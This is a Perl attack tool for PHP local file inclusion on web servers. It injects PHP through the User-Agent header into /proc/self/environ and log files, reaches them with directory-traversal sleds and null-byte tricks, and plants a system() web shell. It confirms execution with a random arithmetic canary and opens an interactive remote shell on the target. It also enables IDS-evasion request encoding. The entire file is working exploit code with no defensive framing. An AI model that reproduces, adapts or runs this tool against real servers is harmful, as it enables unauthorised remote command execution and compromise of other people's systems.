use strict;
use Term::ANSIColor;
use Getopt::Std;
use LW2;
 
my %opts  = ();
getopts('h:u:i:', \%opts);
usage() unless($opts{u});
usage() unless($opts{h});
usage() unless($opts{i});
my $input = $opts{i};
my $url   = $opts{u};
my $host  = $opts{h};
my $var1  = generate_random_int();
my $var2  = generate_random_int();
my $total = $var1 + $var2;
my $open  = generate_random_string(4);
my $close = generate_random_string(8);
my $beginning   = generate_random_string(6);
my $ending      = generate_random_string(4);
my $shell       = '<?php echo("'.$beginning.'"); system($_GET[\'cmd\']); echo("'.$ending.'"); ?>';
my $sled        = "../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..";
my @logs        = `cat httpdlogs.conf`;
my $test        = '<?php $var = ' . $var1 . ' + ' . $var2 . '; echo("' . $open . '"); echo($var); echo("' . $close . '"); ?>';
my $file = "/proc/self/environ";
test_matches($url,$test,$shell,$file);
my $lol_error   = download($test,$host,"wget/mozilla");
my $lol_shelled = download($shell,$host,"wget/Mozilla");
foreach my $log (@logs) {
    chomp($log);
    test_matches($url,"wget/mozilla","wget/mozilla",$log);
}
sub test_matches {
   my $url  = shift;
   my $test = shift;
   my $win  = shift;
   my $file = shift;   
   test_match($url,$test,$win,$file);
   test_match($url,$test,$win,"$sled$file");
   test_match($url,$test,$win,"$file%00");
   test_match($url,$test,$win,"$sled$file%00");
}
sub test_match {
    my $urn   = shift;
    my $use   = shift;
    my $win   = shift;
    my $match = shift;
    $urn =~ s/$input=[^\&\?\;]+/$input=$match/g;
 
    my ($l1,$l2,$l0) = test_rxe(download($urn,$host,$use));
    if ($l0 gt 0) {
        print color 'bold blue';
        print "\r[";
        print color 'reset';
        print "INFO";
        print color 'bold blue';
        print "]  ";
        print color 'red';
        print "Successful code execution on $urn\nSpawning shell...\n";
        print color 'reset';
        spawn_shell($urn,$win);
    }
}
sub spawn_shell {
    my $urk = shift;
    my $use = shift;
 
    my $username = parse_rxe(download($urk . "&cmd=whoami",$host,$use),$beginning,$ending);
    my $hostname = parse_rxe(download($urk . "&cmd=hostname",$host,$use),$beginning,$ending);
    chomp($username);
    chomp($hostname);
 
    while (1) {
        print color 'bold green';
        print "$username\@$hostname";
        print color 'bold blue';
        print " \$ ";
        print color 'reset';
        my $input = <>;
        $input =~ s/\ /%20/g;
        chomp($input);
        print parse_rxe(download($urk . "&cmd=$input",$host,$use),$beginning,$ending);
    }
}
sub parse_rxe {
    my $output  = shift;
    my $begin   = shift;
    my $end     = shift;
    my $mangler = generate_random_string(10);
    $output =~ s/\n/$mangler/g;
    $output =~ /$begin(.+)$end/g;
    my $ret = $1;
    $ret =~ s/$mangler/\n/g;
    return($ret);
}
sub test_rxe
{
    my $output = shift;
    if ($output =~ /$open(.*)$close/g) {
        my $test_data = $1;
        if ($test_data =~ /(.*)$total(.*)/g) {
            my $preslack  = $1;
            my $postslack = $2;
            return($preslack,$postslack,1);
        }
    }
    return (0,0,0);
} 
sub download
{
    my $uri  = shift;
    my $try  = 5;
    my $host = shift;
    my $ua   = shift;
    my %request;
    my %response;
    LW2::http_init_request(\%request);
    $request{'whisker'}->{'method'} = "GET";
    $request{'whisker'}->{'host'} = $host;
    $request{'whisker'}->{'uri'} = $uri;
    $request{'whisker'}->{'encode_anti_ids'} = 9;
    $request{'User-Agent'} = $ua;
    LW2::http_fixup_request(\%request);
    if(LW2::http_do_request(\%request, \%response)) {
        if($try < 5) {
            print "Failed to fetch $uri on try $try. Retrying...\n";
            return undef if(!download($uri, $try++));
        }
        print "Failed to fetch $uri.\n";
        return undef;
    } else {
        return ($response{'whisker'}->{'data'});
    }
} 
sub generate_random_string($)
{
 my $len = shift(@_);
 
 my @chars=('a'..'z','A'..'Z','0'..'9','_');
 my $string;
 for(my $i = 0; $i < $len; $i++)
 {
   $string.=$chars[rand(@chars)];
 }
 return $string;
} 
sub usage()
{
    print "[~] Maybe Arguments werent parsed right? try [!] ";
    print "perl php-injection -h [host] -i [vuln input] -u [uri]\n";
    exit(1);
} 
sub generate_random_int()
{
	my $int = int(rand(500 - 100 + 1)) + 100;
	return $int;
}